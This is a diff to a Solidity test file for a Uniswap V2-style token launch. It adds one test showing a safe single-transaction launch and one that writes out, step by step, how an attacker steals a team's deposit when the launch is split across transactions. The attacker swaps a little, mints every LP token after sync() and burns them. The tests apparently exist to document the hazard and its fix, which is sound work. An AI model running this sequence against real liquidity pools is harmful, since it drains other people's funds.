@@ -2,6 +2,9 @@
 pragma solidity 0.8.28;
 
 import {BaseV2Test} from "../utils/BaseV2Test.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+import {ManualV2Launch} from "../mocks/ManualV2Launch.sol";
 import {ITestPair} from "../utils/UniswapV2.sol";
 
 /**
@@ -130,5 +133,90 @@ contract AttackV2Test is BaseV2Test {
             team,
             block.timestamp
         );
+    }
+
+    /**
+     * @notice The correct manual workaround: in one transaction, send large amounts of both tokens to the pair at the
+     *         target ratio, call `sync()` and add the rest through the router. The 2 wei of dust are now tiny next to
+     *         the reserves, so the price is exact up to rounding, and the team owns all the liquidity.
+     */
+    function test_FullAmountsInOneTransactionGiveExactPrice() public {
+        ITestPair pair = attack(2);
+        ManualV2Launch manual = new ManualV2Launch();
+
+        vm.startPrank(team);
+        newToken.approve(address(manual), AMOUNT_NEW);
+        wbnb.approve(address(manual), AMOUNT_WBNB);
+        uint256 teamNewBefore = newToken.balanceOf(team);
+        uint256 teamWbnbBefore = wbnb.balanceOf(team);
+        // Half of the deposit goes in through sync(), the other half through the router.
+        manual.launch(
+            router,
+            pair,
+            IERC20(address(newToken)),
+            IERC20(address(wbnb)),
+            AMOUNT_NEW / 2,
+            AMOUNT_WBNB / 2,
+            AMOUNT_NEW / 2,
+            AMOUNT_WBNB / 2
+        );
+        vm.stopPrank();
+
+        // The price is 0.37 WBNB per NEW up to rounding of 1e-15.
+        (uint256 reserveNew, uint256 reserveWbnb) = reserves(pair);
+        assertApproxEqRel(reserveWbnb * 1e18 / reserveNew, 0.37e18, 1e3);
+
+        // The team holds every LP token except MINIMUM_LIQUIDITY, so the tokens sent through sync() are its own:
+        // burning the LP tokens returns the whole deposit, minus a few wei.
+        uint256 liquidity = pair.balanceOf(team);
+        assertEq(liquidity, pair.totalSupply() - 1000);
+        vm.startPrank(team);
+        pair.transfer(address(pair), liquidity);
+        pair.burn(team);
+        vm.stopPrank();
+        assertApproxEqAbs(newToken.balanceOf(team), teamNewBefore, 1e6);
+        assertApproxEqAbs(wbnb.balanceOf(team), teamWbnbBefore, 1e6);
+    }
+
+    /**
+     * @notice The same workaround split across transactions loses the tokens. After `sync()` the pair has reserves but
+     *         no LP tokens, so whoever mints first owns everything in it. The attacker buys a little NEW from the pair,
+     *         mints, burns and takes the team's tokens.
+     */
+    function test_FullAmountsSplitAcrossTransactionsAreStolen() public {
+        ITestPair pair = attack(2);
+
+        // Transaction 1: the team sends half of the deposit to the pair and calls sync().
+        vm.startPrank(team);
+        newToken.transfer(address(pair), AMOUNT_NEW / 2);
+        wbnb.transfer(address(pair), AMOUNT_WBNB / 2);
+        pair.sync();
+        vm.stopPrank();
+
+        uint256 attackerNewBefore = newToken.balanceOf(attacker);
+        uint256 attackerWbnbBefore = wbnb.balanceOf(attacker);
+        vm.startPrank(attacker);
+        // Buy some NEW from the pair: 0.01 WBNB in, the output follows the 0.3% fee formula of the pair.
+        uint256 amountIn = 0.01e18;
+        (uint256 reserveNew, uint256 reserveWbnb) = reserves(pair);
+        uint256 newOut = amountIn * 997 * reserveNew / (reserveWbnb * 1000 + amountIn * 997);
+        wbnb.transfer(address(pair), amountIn);
+        (uint256 amount0Out, uint256 amount1Out) =
+            pair.token0() == address(newToken) ? (newOut, uint256(0)) : (uint256(0), newOut);
+        pair.swap(amount0Out, amount1Out, attacker, "");
+
+        // Mint with a tiny deposit: with no LP tokens yet, the attacker gets all of them except MINIMUM_LIQUIDITY.
+        newToken.transfer(address(pair), newOut);
+        wbnb.transfer(address(pair), amountIn);
+        uint256 liquidity = pair.mint(attacker);
+        assertEq(liquidity, pair.totalSupply() - 1000);
+
+        // Burn and take almost everything the team sent.
+        pair.transfer(address(pair), liquidity);
+        pair.burn(attacker);
+        vm.stopPrank();
+
+        assertGt(newToken.balanceOf(attacker) - attackerNewBefore, AMOUNT_NEW / 2 * 99 / 100);
+        assertGt(wbnb.balanceOf(attacker) + 2 * amountIn - attackerWbnbBefore, AMOUNT_WBNB / 2 * 99 / 100);
     }
 }
